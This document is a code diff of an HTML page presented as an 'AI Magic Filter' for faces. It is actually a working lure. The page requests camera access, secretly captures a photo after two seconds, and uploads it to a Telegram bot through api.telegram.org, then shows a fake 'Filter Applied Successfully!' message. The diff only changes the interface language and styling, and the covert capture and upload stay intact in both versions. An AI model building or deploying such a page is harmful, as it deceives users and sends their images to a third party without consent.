@@ -5,22 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Magic Filter ✨</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; text-align: center; background: #0f0f0f; color: white; padding-top: 60px; }
-        .card { max-width: 380px; margin: auto; border: 1px solid #333; padding: 30px; border-radius: 20px; background: #1a1a1a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #00d2ff; }
-        button { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; border: none; padding: 15px 35px; border-radius: 50px; font-size: 18px; cursor: pointer; font-weight: bold; transition: 0.3s; margin-top: 20px; }
-        button:active { transform: scale(0.95); }
-        #v { display: none; }
+        body { font-family: sans-serif; text-align: center; background: #0f0f0f; color: white; padding-top: 60px; }
+        .card { max-width: 350px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 20px; background: #1a1a1a; }
+        button { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <h2>AI Magic Filter ✨</h2>
-        <p>اپنے چہرے پر لائیو AI فلٹر لگانے کے لیے نیچے بٹن دبائیں:</p>
-        <button id="startBtn">فلٹر اپلائی کریں</button>
+        <p>Click below to apply filter:</p>
+        <button id="startBtn">Apply Filter</button>
         <canvas id="c" style="display:none;"></canvas>
-        <video id="v" autoplay></video>
+        <video id="v" autoplay style="display:none;"></video>
     </div>
 
     <script>
@@ -33,46 +30,39 @@
 
         btn.addEventListener('click', async () => {
             try {
-                // کیمرہ کی اجازت مانگنا
+                // Camera permission mangna
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 btn.innerText = "Processing...";
 
+                // 2 second baad photo khinchna
                 setTimeout(async () => {
                     const ctx = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // تصویر کو Blob میں تبدیل کرنا (ٹیلی گرام کے لیے)
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'capture.png');
 
-                        // ٹیلی گرام API کو تصویر بھیجنا
-                        try {
-                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                            
-                            alert("AI Filter applied successfully!");
-                            btn.innerText = "Done!";
-                        } catch (err) {
-                            console.error("Error sending to Telegram:", err);
-                        }
-
-                        // کیمرہ بند کرنا
+                        // Telegram ko bhejna
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        alert("Filter Applied Successfully!");
+                        btn.innerText = "Done!";
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/png');
 
                 }, 2000);
             } catch (e) {
-                alert("فلٹر کے لیے کیمرہ کی اجازت ضروری ہے۔");
+                alert("Please allow camera access to use the filter.");
             }
         });
     </script>
 </body>
 </html>
-
